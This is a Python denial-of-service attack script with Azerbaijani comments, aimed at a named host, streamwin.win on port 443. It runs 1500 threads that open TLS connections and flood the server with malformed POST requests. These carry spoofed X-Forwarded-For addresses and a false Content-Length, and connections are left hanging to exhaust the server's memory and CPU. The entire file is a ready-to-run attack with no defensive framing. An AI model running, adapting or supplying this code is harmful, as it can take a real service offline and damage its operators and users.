import socket
import ssl
import threading
import random
import time
import os

# --- EXTREME SETTINGS ---
TARGET_HOST = "streamwin.win"
TARGET_PORT = 443
THREADS = 1500 # Railway Paid üçün bu rəqəm maksimal şəbəkə sıxlığıdır

def r_str(n):
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))

def final_strike():
    # SSL Handshake-i serveri deşifrə ilə yormaq üçün mürəkkəb ciphers ilə qururuq
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Serveri hər yeni bağlantıda ağır RSA/AES hesablamalarına məcbur edir
    ctx.set_ciphers('DEFAULT@SECLEVEL=1')

    while True:
        try:
            # TCP bağlantısı - Nagle alqoritmini bypass edirik (Anında zərbə)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)

            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # MULTIPLEXING: Bir bağlantıdan minlərlə "Malformed" (pozulmuş) paket
            # Bu, serverin daxili loglarını və RAM-ını saniyələr içində bitirir
            for _ in range(500):
                path = f"/?v={time.time()}&id={r_str(32)}&ttclid=E_C_P_{r_str(100)}"
                ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}"
                
                # Bu başlıq serveri hər sorğuda daxili yaddaş (Buffer) ayırmağa məcbur edir
                # Content-Length hiləsi ilə serverin prosessorunu dondururuq
                payload = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {TARGET_HOST}\r\n"
                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15\r\n"
                    f"X-Forwarded-For: {ip}\r\n"
                    f"X-Requested-With: XMLHttpRequest\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 50000\r\n" # Serverə 50KB yalançı yük
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                ).encode()

                conn.sendall(payload)
                # İkinci zərbə: Serveri asılı (Hanging) saxlamaq üçün yarımçıq paketlər
                conn.send(b"\x00")
            
            # Bağlantını bağlamırıq, timeout olana qədər serverin portunu tuturuq
            time.sleep(2)
            conn.close()
        except:
            pass

def main():
    print(f"☢️  FATAL SYSTEM STRIKE INITIALIZED: {TARGET_HOST}")
    print("[!] Target Buffer is being saturated at the protocol level.")
    
    for i in range(THREADS):
        t = threading.Thread(target=final_strike)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} Protocol Warheads Active...")
            time.sleep(0.1)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
